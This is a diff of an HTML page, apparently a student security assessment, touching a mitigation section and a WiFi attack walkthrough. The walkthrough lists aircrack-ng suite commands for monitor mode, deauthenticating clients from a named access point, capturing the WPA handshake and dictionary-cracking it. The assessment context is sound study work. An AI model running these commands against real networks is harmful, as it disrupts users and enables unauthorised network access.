@@ -163,10 +163,9 @@ CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H
 <h5>Mitigation</h5>
 <p>
 The best mitigation techniques would be implementing social logins that make use of 2 factor authentication, creating a strong password for the social login account, limiting the amount of people that have administrator privileges and having an audit log for important events such as authentications. The main purpose of implementing a strong password would be to minimize the risk of having a compromised password. Having a 2 factor authentication on top of the strong password would act as a gateway to the account, reducing the impact of a compromised user account. Limiting the number of administrator accounts would then help limit the number of potential compromised administrator accounts, reducing the risk of having an administrator account be compromised. 
-<p align="left">
+<p align="center">
 <img src="/img/AttackSurface3.png" alt="Atack Surface 3" width="75%" height="75%">
 </p>
-
 </p>
 
 
@@ -291,15 +290,25 @@ For method 1, we would be performing a Distributed Denial of Service Attack (DDo
 <p>
 Access Kali and kill all processes using the WiFi interface
 `airmon-ng check kill`
-Start the network adapter in monitor mode and view all nearby access points to identify target network. 
+Start the network adapter in monitor mode and view all nearby access points to identify target network.
+<p align="center">
 <img src="/img/AllNearbyAP.png" alt="All Nearby AP" width="75%" height="75%">
+</p>
 View all the clients that are connected to the network
+
 `airodump-ng -c 1 --bssid 80:35:C1:13:C1:2C -w /root wlan0mon`
+
 Deauthenticate all clients from the network in order to get them to re-authenticated themselves. While clients attempt to reauthenticate themselves, we would be able to capture the WPA handshake.
+
 `aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon`
+
 After obtaining the handshake, compare the handshake with a dictionary consisting of all common passwords.
+
 `aircrack-ng -a2 -b 80:35:C1:13:C1:2C -w /root/passwords.txt /root/hacking-01.cap`
+
+<p align="center">
 <img src="/img/ObtainedKey.png" alt="Obtained Key" width="75%" height="75%">
+</p>
 </p>
 <h5>Step 2: Identify the target IoT Device </h5>
 <p></p>
